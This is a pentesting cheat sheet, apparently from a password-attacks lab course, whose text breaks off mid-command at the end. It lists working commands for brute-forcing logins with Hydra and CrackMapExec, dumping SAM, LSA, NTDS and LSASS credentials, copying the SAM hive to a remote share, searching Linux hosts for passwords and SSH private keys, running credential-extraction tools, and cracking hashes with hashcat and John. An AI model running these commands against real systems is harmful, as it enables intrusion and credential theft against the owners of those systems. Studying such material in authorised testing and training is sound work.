# Pentesting Commands Collection

## Password Mutations

**Command Description:** Generates a wordlist based on keywords from a website using cewl.

[cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist](#)

**Command Description:** Generates a rule-based wordlist using Hashcat.

[hashcat --force password.list -r custom.rule --stdout > mut_password.list](#)

**Command Description:** Generates potential usernames using username-anarchy and a list of first and last names.

[./username-anarchy -i /path/to/listoffirstandlastnames.txt](#)

**Command Description:** Downloads a list of file extensions related to compressed files.

[curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt](#)

## Remote Password Attacks

**Command Description:** Uses CrackMapExec over WinRM to brute force usernames and passwords.

[crackmapexec winrm <ip> -u user.list -p password.list](#)

**Command Description:** Enumerates SMB shares using CrackMapExec.

[crackmapexec smb <ip> -u "user" -p "password" --shares](#)

**Command Description:** Uses Hydra to crack passwords over a specified service with a user list and password list.

[hydra -L user.list -P password.list <service>://<ip>](#)

**Command Description:** Uses Hydra to crack passwords over a specified service with a username and password list.

[hydra -l username -P password.list <service>://<ip>](#)

**Command Description:** Uses CrackMapExec with admin credentials to dump password hashes from SAM.

[crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam](#)

**Command Description:** Uses CrackMapExec with admin credentials to dump LSA secrets.

[crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa](#)

**Command Description:** Uses CrackMapExec with admin credentials to dump hashes from the NTDS file.

[crackmapexec smb <ip> -u <username> -p <password> --ntds](#)

**Command Description:** Establishes a PowerShell session using Evil-WinRM with a password hash.

[evil-winrm -i <ip> -u Administrator -H "<passwordhash>"](#)

## Windows Local Password Attacks

**Command Description:** Lists running processes and their services using tasklist.

[tasklist /svc](#)

**Command Description:** Searches for the string "password" in various file types using findstr.

[findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml](#)

**Command Description:** Displays information about the LSASS process using Get-Process.

[Get-Process lsass](#)

**Command Description:** Creates an LSASS memory dump using rundll32.

[rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full](#)

**Command Description:** Parses LSASS memory dump using Pypykatz.

[pypykatz lsa minidump /path/to/lsassdumpfile](#)

**Command Description:** Saves a copy of the SAM registry hive using reg.exe.

[reg.exe save hklm\sam C:\sam.save](#)

**Command Description:** Transfers a file using move in Windows.

[move sam.save \\<ip>\NameofFileShare](#)

## Linux Local Password Attacks

**Command Description:** Finds .conf, .config, and .cnf files on a Linux system.

[for l in $(echo ".conf .config .cnf"); do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core"; done](#)

**Command Description:** Searches for credentials in specified .cnf files on a Linux system.

[for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib"); do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"; done](#)

**Command Description:** Finds common database files (.sql, .db, etc.) on a Linux system.

[for l in $(echo ".sql .db .*db .db*"); do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man"; done](#)

**Command Description:** Searches for text files in /home directories on a Linux system.

[find /home/* -type f -name "*.txt" -o ! -name "*.*"](#)

**Command Description:** Searches for common script file types (.py, .pl, .sh, etc.) on a Linux system.

[for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share"; done](#)

**Command Description:** Searches for common document file types (.xls, .doc, .pdf, etc.) on a Linux system.

[for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*"); do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core"; done](#)

**Command Description:** Views crontab contents on a Linux system.

[cat /etc/crontab](#)

**Command Description:** Lists files starting with cron in /etc directory on a Linux system.

[ls -la /etc/cron.*](#)

**Command Description:** Searches the file system for SSH keys using grep.

[grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"](#)

**Command Description:** Searches a user's home directory for SSH keys using grep.

[grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"](#)

**Command Description:** Searches a user's home directory for SSH-RSA keys using grep.

[grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"](#)

**Command Description:** Views the last 5 lines of bash history files in /home directories on a Linux system.

[tail -n5 /home/*/.bash*](#)

**Command Description:** Runs Mimipenguin.py to extract credentials from Linux memory.

[python3 mimipenguin.py](#)

**Command Description:** Runs Mimipenguin.sh to extract credentials from Linux memory.

[bash mimipenguin.sh](#)

**Command Description:** Runs Lazagne.py to extract credentials from Linux browsers.

[python3 lazagne.py browsers](#)

## Cracking Passwords

**Command Description:** Cracks NTLM hashes using Hashcat and a specified wordlist.

[hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt](#)

**Command Description:** Cracks a single NTLM hash using Hashcat and displays results.

[hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show](#)

**Command Description:** Combines passwd.bak and shadow.bak using unshadow for cracking.

[unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes](#)

**Command Description:** Cracks unshadowed hashes using Hashcat and outputs to unshadowed.cracked.

[hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked](#)

**Command Description:** Cracks MD5 hashes using Hashcat and a wordlist.

[hashcat -m 500 -a 0 md5-hashes.list /usr/share/wordlists/rockyou.txt](#)

**Command Description:** Cracks BitLocker hashes using Hashcat and a wordlist.

[hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked](#)

**Command Description:** Generates SSH hashes using ssh2john.py from SSH private keys.

[python3 ssh2john.py SSH.private > ssh.hash](#)

**Command Description:** Cracks SSH hashes using John the Ripper.

[john ssh.hash --show](#)

**Command Description:** Converts protected .docx to hash using Office2john.py.

[office2john.py Protected.docx > protected-docx.hash](#)

**Command Description:** Cracks protected .docx hash using John the Ripper.

[john --wordlist=rockyou.txt protecteddocx.hash](#)

**Command Description:** Converts PDF to hash using Pdf2john.pl.

[pdf2john.pl PDF.pdf > pdf.hash](#)

**Command Description:** Cracks PDF hash using John the Ripper.

[john --wordlist=rockyou.txt pdf
